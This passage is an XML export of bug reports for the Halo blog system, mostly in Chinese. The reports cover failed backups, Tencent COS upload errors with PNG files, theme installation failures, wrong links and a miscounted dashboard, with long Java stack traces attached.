io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na] Caused by: java.nio.file.NoSuchFileException: /tmp/halo-backup/halo-backup-2020-05-15-23-09-24--834581693.zip at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) ~[na:na] at java.base/sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:219) ~[na:na] at java.base/java.nio.file.Files.newByteChannel(Files.java:370) ~[na:na] at java.base/java.nio.file.Files.createFile(Files.java:647) ~[na:na] at run.halo.app.service.impl.BackupServiceImpl.backupWorkDirectory(BackupServiceImpl.java:170) ~[classes!/:na] ... 106 common frames omitted ```  --- </body>
		<created>2020-05-15 15:11:48</created>
		<closed>2020-07-19 14:04:45</closed>
	</bug>
	<bug>
		<id>850</id>
		<title>!= string comparison</title>
		<body>`if (newActivatedThemeId != activatedThemeId) {                     activateTheme(newActivatedThemeId);                 }`  The code above existing in ThemeServiceImpl.Java will not give the outcome wanted as it uses != to compare strings. != will always be true because the strings data point to different memory locations and != checks for same reference. Therefore, `!string1.equals(string2)` is recommended here. `.equals` compares values rather than references, so if the strings above have the same value, it will evaluate to false.</body>
		<created>2020-05-15 07:23:12</created>
		<closed>2020-05-15 08:55:15</closed>
	</bug>
	<bug>
		<id>785</id>
		<title>在博客设置中设置取消全局绝对路径导致无法访问需要密码的文章</title>
		<body>取消全局绝对路径会影响到需要密码访问的文章，输入密码后跳转的网址只有archives/...，archives前面的域名不见了 </body>
		<created>2020-04-26 03:24:35</created>
		<closed>2020-05-16 11:21:43</closed>
	</bug>
	<bug>
		<id>779</id>
		<title>请求字段缺失</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-04-21 00:29:37</created>
		<closed>2020-04-21 00:31:58</closed>
	</bug>
	<bug>
		<id>775</id>
		<title>附件设置为腾讯云，上传附件png格式时错误</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt; 版本：1.3.2 数据库：MySQL 5.7.29-log 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36 ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ``` 2020-04-20 17:30:48.059 ERROR 6 --- [XNIO-1 task-16] r.h.app.core.ControllerExceptionHandler  : Captured an exception  run.halo.app.exception.FileOperationException: 附件 test.png 上传失败(腾讯云) at run.halo.app.handler.file.TencentCosFileHandler.upload(TencentCosFileHandler.java:136) ~[classes!/:na] at run.halo.app.handler.file.FileHandlers.upload(FileHandlers.java:51) ~[classes!/:na] at run.halo.app.service.impl.AttachmentServiceImpl.upload(AttachmentServiceImpl.java:106) ~[classes!/:na] at run.halo.app.service.impl.AttachmentServiceImpl$$FastClassBySpringCGLIB$$2d9c80b9.invoke(&lt;generated&gt;) ~[classes!/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:685) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.service.impl.AttachmentServiceImpl$$EnhancerBySpringCGLIB$$e000d062.upload(&lt;generated&gt;) ~[classes!/:na] at run.halo.app.controller.admin.api.AttachmentController.uploadAttachment(AttachmentController.java:76) ~[classes!/:na] at run.halo.app.controller.admin.api.AttachmentController$$FastClassBySpringCGLIB$$8f3ff968.invoke(&lt;generated&gt;) ~[classes!/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:na] at sun.reflect.GeneratedMethodAccessor180.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_242] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_242] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at run.halo.app.controller.admin.api.AttachmentController$$EnhancerBySpringCGLIB$$399cb04c.uploadAttachment(&lt;generated&gt;) ~[classes!/:na] at sun.reflect.GeneratedMethodAccessor550.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_242] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_242] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:879) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) [spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) [spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:523) [jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) [spring-webmvc-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) [jakarta.servlet-api-4.0.3.jar!/:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:116) [classes!/:na] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:191) [classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:49) [classes!/:na] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at run.halo.app.filter.LogFilter.doFilterInternal(LogFilter.java:38) [classes!/:na] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:109) [spring-boot-actuator-2.2.5.RELEASE.jar!/:2.2.5.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) [spring-web-5.2.4.RELEASE.jar!/:5.2.4.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.29.Final.jar!/:2.0.29.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_242] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_242] at java.lang.Thread.run(Thread.java:821) [na:1.8.0_242] Caused by: javax.imageio.IIOException: I/O error reading PNG header! at com.sun.imageio.plugins.png.PNGImageReader.readHeader(PNGImageReader.java:315) ~[na:1.8.0_242] at com.sun.imageio.plugins.png.PNGImageReader.getWidth(PNGImageReader.java:1369) ~[na:1.8.0_242] at run.halo.app.handler.file.TencentCosFileHandler.upload(TencentCosFileHandler.java:125) ~[classes!/:na] ... 100 common frames omitted Caused by: javax.imageio.IIOException: Bad PNG signature! at com.sun.imageio.plugins.png.PNGImageReader.readHeader(PNGImageReader.java:242) ~[na:1.8.0_242] ... 102 common frames omitted ```  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt; 正常上传图片。 ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt; ![image](https://user-images.githubusercontent.com/41626157/79737654-3807f000-832e-11ea-8e04-260988701fbb.png) ![image](https://user-images.githubusercontent.com/41626157/79737855-84ebc680-832e-11ea-88b3-a0321c060c51.png) - 在附件页面上传png图片失败，失败时对象存储有上传的图片 - 在写文章页通过复制png图片可以上传成功 - jpg格式正常上传 - 本地上传png也正常，使用腾讯云就不行，其他云存储也没有，所有就没测试。</body>
		<created>2020-04-20 09:53:43</created>
		<closed>2020-04-22 01:16:32</closed>
	</bug>
	<bug>
		<id>765</id>
		<title>请求fonts.cat.net加载很慢</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境 Server 版本：1.2.0 Admin 版本：1.2.0 数据库：MySQL 运行模式：production 启动时间：2020-04-13 23:04 &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为 希望找个请求可以成功，而且快一点。 &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为 请求很慢，因为某个资源文件是从fonts.cat.net请求的，请求很久就失败了 ![image](https://user-images.githubusercontent.com/43698606/79304619-59c73880-7f24-11ea-9a54-cf3bacb4da1d.png)  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？   你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-04-15 06:26:06</created>
		<closed>2020-04-15 16:27:41</closed>
	</bug>
	<bug>
		<id>748</id>
		<title>留言邮件中链接地址不完整 - 缺少博客地址</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;    &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  版本：1.3.1 数据库：H2 1.4.196 (2017-06-10) 运行模式：production User Agent：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt; 正确定位 `https://blog.buckbit.top/s/assignment`  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt; ![image](https://user-images.githubusercontent.com/44362358/78337779-1e437a80-75c4-11ea-8e6b-de86a23e5260.png)  </body>
		<created>2020-04-03 08:00:33</created>
		<closed>2020-04-05 06:51:08</closed>
	</bug>
	<bug>
		<id>736</id>
		<title>升级1.3，访问出错，然后回退到1.2，启动后无法发文章，报错：字段验证错误，请完善后重试！</title>
		<body></body>
		<created>2020-03-29 05:11:44</created>
		<closed>2020-03-29 05:14:00</closed>
	</bug>
	<bug>
		<id>713</id>
		<title>开发环境在线安装和zip安装主题失败</title>
		<body>## 我的环境  ``` 版本： 数据库：H2 1.4.196 (2017-06-10) 运行模式：production 启动时间：2020-03-25 22:51 ```  ---  ## 错误日志  ``` java.lang.NullPointerException: null at java.util.StringTokenizer.&lt;init&gt;(StringTokenizer.java:199) ~[na:1.8.0_242] at java.util.StringTokenizer.&lt;init&gt;(StringTokenizer.java:221) ~[na:1.8.0_242] at run.halo.app.utils.VersionUtil.getCanonicalVersion(VersionUtil.java:19) ~[main/:na] at run.halo.app.utils.VersionUtil.compare(VersionUtil.java:50) ~[main/:na] at run.halo.app.utils.VersionUtil.compareVersion(VersionUtil.java:79) ~[main/:na] at run.halo.app.service.impl.ThemeServiceImpl.add(ThemeServiceImpl.java:483) ~[main/:na] at run.halo.app.service.impl.ThemeServiceImpl.upload(ThemeServiceImpl.java:449) ~[main/:na] at run.halo.app.controller.admin.api.ThemeController.uploadTheme(ThemeController.java:163) ~[main/:na] at run.halo.app.controller.admin.api.ThemeController$$FastClassBySpringCGLIB$$e8e9d45c.invoke(&lt;generated&gt;) ~[main/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.4.RELEASE.jar:5.2.4.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.4.RELEASE.jar:5.2.4.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[main/:na] at sun.reflect.GeneratedMethodAccessor219.invoke(Unknown Source) ~[na:na] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_242] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_242] ```  在线安装和zip安装主题均失败， 似乎 ```         if (StringUtils.isNotEmpty(tmpThemeProperty.getRequire()) &amp;&amp; !VersionUtil.compareVersion(HaloConst.HALO_VERSION, tmpThemeProperty.getRequire())) {             throw new ThemeNotSupportException("当前主题仅支持 Halo " + tmpThemeProperty.getRequire() + " 以上的版本");         } ``` 中 HaloConst.HALO_VERSION 为空？</body>
		<created>2020-03-25 15:02:25</created>
		<closed>2020-03-28 06:33:26</closed>
	</bug>
	<bug>
		<id>703</id>
		<title>最新开发版admin首页仪表盘文章数量显示错误</title>
		<body>![image](https://user-images.githubusercontent.com/51355342/77243383-75506380-6c44-11ea-8da6-03916b84cdde.png) ![image](https://user-images.githubusercontent.com/51355342/77243388-80a38f00-6c44-11ea-927b-98451c7baa3f.png) ![image](https://user-images.githubusercontent.com/51355342/77243399-9a44d680-6c44-11ea-9983-377c4d8d2975.png) ![image](https://user-images.githubusercontent.com/51355342/77243404-a2047b00-6c44-11ea-95b0-0759d98023da.png) 首页仪表盘显示的文章数量会比真实文章数量+1。该bug在最新开发版本上发现</body>
		<created>2020-03-22 05:55:16</created>
		<closed>2020-03-22 14:15:53</closed>
	</bug>
	<bug>
		<id>700</id>
		<title>配置阿里云OSS上传文件NullPointerException</title>
